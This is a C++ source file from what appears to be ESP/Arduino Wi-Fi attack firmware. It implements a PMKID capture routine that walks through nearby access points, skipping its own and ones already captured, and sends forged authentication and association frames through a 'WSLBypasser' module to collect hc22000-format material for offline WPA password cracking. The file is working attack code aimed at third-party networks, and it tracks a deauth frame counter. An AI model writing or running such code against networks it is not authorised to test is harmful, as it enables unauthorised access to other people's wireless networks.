#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

static uint32_t s_lastProbeMs = 0;
static uint8_t  s_probeIdx = 0;

void resetPmkidState() {
    s_lastProbeMs = 0;
    s_probeIdx = 0;
}

void pmkidProbe(const Ctx& ctx) {
    if (!ctx.pmkidProbe) return;
    uint32_t now = millis();
    if (now - s_lastProbeMs < 1500) return;
    uint8_t n = ctx.beaconCount;
    if (!n) return;

    for (uint8_t k = 0; k < n; k++) {
        s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
        BeaconSlot& b = ctx.beacons[s_probeIdx];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (!b.ssid[0]) continue;
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
        WSLBypasser::sendAuthentication(b.bssid);
        WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
        s_lastProbeMs = now;
        (*ctx.framesDeauth)++;
        return;
    }
}

} // namespace Methods
} // namespace Cap
